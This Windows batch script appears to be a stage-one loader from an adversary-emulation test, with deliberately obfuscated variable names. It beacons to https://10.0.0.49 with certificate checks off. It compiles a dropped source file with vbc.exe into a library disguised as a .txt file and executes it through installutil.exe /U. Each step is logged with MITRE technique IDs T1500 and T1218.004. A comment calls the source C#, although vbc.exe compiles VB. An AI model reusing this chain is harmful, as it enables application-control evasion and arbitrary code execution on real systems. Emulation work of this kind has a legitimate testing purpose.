@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET recnn=%APPDATA%\8034\cd44e2f5
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?8034-7
SET lqyereup=ITZEL-S2BS
SET ufeybybm=7
SET hpnjatpj=expressvp.txt
SET njozco=file.txt
SET kkjwr=8034

REM Derived variables
SET vbyyqa=%APPDATA%\!ufeybybm!
SET rekgd=%vbyyqa%\macula-simulations.log
SET qaerv=vbc.exe
SET hqwwyc=installutil.exe

REM Debug: Script start
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: script_start=Stage1_BAT>> "!rekgd!" 2>nul

REM 1. Heartbeat check to server
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: heartbeat_check_start=!uouoq!>> "!rekgd!" 2>nul
curl -k -s -o nul "!uouoq!"
SET rqrebc=0
IF !ERRORLEVEL! EQU 0 (SET rqrebc=1)
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: heartbeat_check_complete=result:!rqrebc!>> "!rekgd!" 2>nul

REM 2. TTP T1500 - Compile After Delivery (C# compilation)
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: dir_change_start=!recnn!>> "!rekgd!" 2>nul
cd /d "!recnn!"
SET ngqssa=0
IF !ERRORLEVEL! EQU 0 (SET ngqssa=1)
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: dir_change_complete=result:!ngqssa!>> "!rekgd!" 2>nul

echo [!DATE! !TIME!][DEBUG][!lqyereup!]: compilation_start=!njozco!>> "!rekgd!" 2>nul
"!qaerv!" /target:library /reference:System.Configuration.Install.dll "!njozco!" /out:"!hpnjatpj!"
SET uvjmpn=0
IF !ERRORLEVEL! EQU 0 (SET uvjmpn=1)

REM TTP logging for T1500
SET yryrr=1
SET pkixbl=
IF !uvjmpn! EQU 0 (SET yryrr=0 & SET pkixbl=compilation_failed)
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: compilation_complete=result:!uvjmpn!>> "!rekgd!" 2>nul

FOR /F "tokens=2,3,4 delims=/ " %%A IN ("!DATE!") DO SET jhkjwa=%%C-%%A-%%B
FOR /F "tokens=1-4 delims=:.," %%A IN ("!TIME!") DO (
    IF "%%D"=="" (
        SET sfhvfh=%%A:%%B:%%C
    ) ELSE (
        SET sfhvfh=%%A:%%B:%%C.%%D
    )
)
SET ruyxbn=!jhkjwa! !sfhvfh!
(echo [!ruyxbn!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1500^|Compile After Delivery=!yryrr!:!pkixbl!) >> "!rekgd!" 2>nul || echo >nul

REM 3. TTP T1218.004 - InstallUtil execution
IF !uvjmpn! EQU 1 (
    echo [!DATE! !TIME!][DEBUG][!lqyereup!]: execution_start=!hqwwyc!>> "!rekgd!" 2>nul
    "!hqwwyc!" /logfile= /LogToConsole=false /U "!hpnjatpj!"
    SET yjtdhk=0
    IF !ERRORLEVEL! EQU 0 (SET yjtdhk=1)
    
    REM TTP logging for T1218.004
    SET gsrzgt=1
    SET tdraae=
    IF !yjtdhk! EQU 0 (SET gsrzgt=0 & SET tdraae=execution_failed)
    echo [!DATE! !TIME!][DEBUG][!lqyereup!]: execution_complete=result:!yjtdhk!>> "!rekgd!" 2>nul
    
    FOR /F "tokens=2,3,4 delims=/ " %%A IN ("!DATE!") DO SET utujpk=%%C-%%A-%%B
    FOR /F "tokens=1-4 delims=:.," %%A IN ("!TIME!") DO (
        IF "%%D"=="" (
            SET egrpkj=%%A:%%B:%%C
        ) ELSE (
            SET egrpkj=%%A:%%B:%%C.%%D
        )
    )
    SET uoihcu=!utujpk! !egrpkj!
    (echo [!uoihcu!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1218.004^|InstallUtil=!gsrzgt!:!tdraae!) >> "!rekgd!" 2>nul || echo >nul
)

REM Debug: Script end
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: script_end=Stage1_BAT_complete>> "!rekgd!" 2>nul

ENDLOCAL
exit /b 0